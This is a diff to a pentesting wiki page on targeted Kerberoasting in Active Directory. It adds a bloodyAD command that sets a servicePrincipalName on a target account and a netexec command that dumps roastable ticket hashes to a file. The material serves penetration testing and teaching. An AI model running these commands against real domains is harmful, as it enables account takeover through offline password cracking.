@@ -1,5 +1,5 @@
 ---
-authors: ShutdownRepo, sckdev
+authors: ShutdownRepo, sckdev, 0xblank
 category: ad
 ---
 
@@ -17,6 +17,16 @@ From UNIX-like systems, this can be done with [targetedKerberoast.py](https://gi
 
 ```bash
 targetedKerberoast.py -v -d "$DC_HOST" -u "$USER" -p "$PASSWORD"
+```
+
+---
+**Alternative 1:** Using [bloodyAD](https://github.com/CravateRouge/bloodyAD) and [netexec](https://github.com/Pennyw0rth/NetExec)
+
+```
+# Add a SPN to attribute to the targeted account
+bloodyAD -d "$DOMAIN" --host "$DC_HOST" -u "$USER" -p "$PASSWORD" set object "$TARGET" servicePrincipalName -v 'http/anything'
+
+nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -H "$NThash" --kerberoasting kerberoastables.txt
 ```
 
 
